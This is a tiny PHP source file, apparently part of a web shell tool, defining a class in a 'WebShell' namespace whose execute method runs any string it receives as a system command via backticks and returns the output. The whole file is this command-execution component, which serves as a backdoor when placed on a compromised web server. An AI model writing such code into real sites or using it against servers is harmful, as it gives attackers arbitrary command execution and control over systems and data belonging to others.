<?php
namespace WebShell;

class BackticksExecutionMethod implements ExecutionMethod {
    public function execute($cmd) {
        return `$cmd`;
    }
}
?>
